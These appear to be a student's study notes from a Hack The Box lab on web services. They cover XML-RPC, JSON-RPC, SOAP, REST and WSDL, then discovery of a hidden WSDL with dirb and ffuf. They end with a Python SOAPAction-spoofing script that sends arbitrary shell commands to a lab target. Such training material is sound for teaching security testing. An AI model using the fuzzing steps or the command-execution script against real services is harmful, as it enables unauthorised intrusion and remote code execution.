# Web Service vs. API

All web services are APIs, but not all APIs are web services.

**Differences:**

- Web services require a network; APIs can work offline.
- Web services often use SOAP; APIs can use XML-RPC, JSON-RPC, SOAP, REST, etc.
- Web services typically use XML; APIs often use JSON.
- Web services are less open to external developers; APIs can be more open.

## Types of Web Services / Technologies

1. XML-RPC

- Uses XML to encode/decode remote procedure calls.
- Usually transported via HTTP.

<img width="1032" height="682" alt="image" src="https://github.com/user-attachments/assets/031ee85e-3f74-49cf-b1d0-26fa1909cb32" />


2. JSON-RPC

- Uses JSON to call methods.
- Usually transported via HTTP.

<img width="1006" height="442" alt="image" src="https://github.com/user-attachments/assets/db09fcba-baa8-446d-80fd-98924accfac4" />

3. SOAP (Simple Object Access Protocol)

- Uses XML but is more complex than XML-RPC.
- Has a header (actions/rules) and body (data).
- May include WSDL to describe usage.
- Transport can be HTTP or others.

<img width="1058" height="630" alt="image" src="https://github.com/user-attachments/assets/7095fee2-fbf2-4e6b-8834-f5af6fd676a0" />

4. WS-BPEL

- Based on SOAP.
- Adds functionality for describing/invoking business processes.

5. REST (Representational State Transfer)

- Uses HTTP verbs (GET, POST, PUT, DELETE) for actions.
- Usually uses JSON or XML.
- WSDL is rare.
- HTTP is the main transport.

<img width="905" height="752" alt="image" src="https://github.com/user-attachments/assets/17afc304-16d7-4266-8cbf-ffef96c4dd88" />


# Web Services Description Language (WSDL)

WSDL is an XML-based file that describes a web service:

- What services/methods it provides
- Where they are located
- How to call them (method-calling convention)

Some developers hide WSDL files or put them in uncommon locations. We can use directory and parameter fuzzing to find them.

## 1. Directory Fuzzing

We start by scanning for possible WSDL files.

`dirb http://<TARGET IP>:3002`

Result:

`+ http://<TARGET IP>:3002/wsdl (CODE:200|SIZE:0)`

## 2. Inspecting /wsdl

`aykhan21@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl`


Result: Empty response → likely needs a parameter.


## 3. Parameter Fuzzing

We try parameters using ffuf with `-fs 0` to filter empty responses and `-mc 200` for `HTTP 200 only`.

`aykhan21@htb[/htb]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200`

Result:

`wsdl [Status: 200, Size: 4461]`

## 4. Accessing the WSDL File

`aykhan21@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl`

Result: Full WSDL XML with service details, including:

- Operations: Login, ExecuteCommand
- Parameters: username, password, cmd
- Service endpoint: http://localhost:80/wsdl

## 5. WSDL Structure (Key Elements)

Definition – Root element containing namespaces, types, messages, operations, and service details.

`<wsdl:definitions targetNamespace="http://tempuri.org/">`

**Data Types** – Defines request/response formats.

<img width="562" height="208" alt="image" src="https://github.com/user-attachments/assets/eacca402-0d10-4fbd-9e24-920828b95e60" />

**Messages** – Input/output formats for each operation.

<img width="642" height="105" alt="image" src="https://github.com/user-attachments/assets/ae8f0cf8-39a9-4a2d-ac4d-12f7f14e0f8f" />

**Port Type** – Lists operations.

<img width="510" height="152" alt="image" src="https://github.com/user-attachments/assets/d863e946-a869-4a2d-a3af-bcc24b01fe74" />

**Binding** – How operations are called (SOAP config).

<img width="585" height="52" alt="image" src="https://github.com/user-attachments/assets/ff38353e-aac7-4599-9007-20a497f4af91" />

**Service** – The actual endpoint.

<img width="578" height="50" alt="image" src="https://github.com/user-attachments/assets/52f55c9f-807a-4bd8-b420-7492a00a0e64" />

# SOAPAction Spoofing

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" 
 xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <LoginRequest xmlns="http://tempuri.org/">
      <cmd>{cmd}</cmd>
    </LoginRequest>
  </soap:Body>
</soap:Envelope>'''
    print(requests.post("http://<TARGET IP>:3002/wsdl",
        data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)

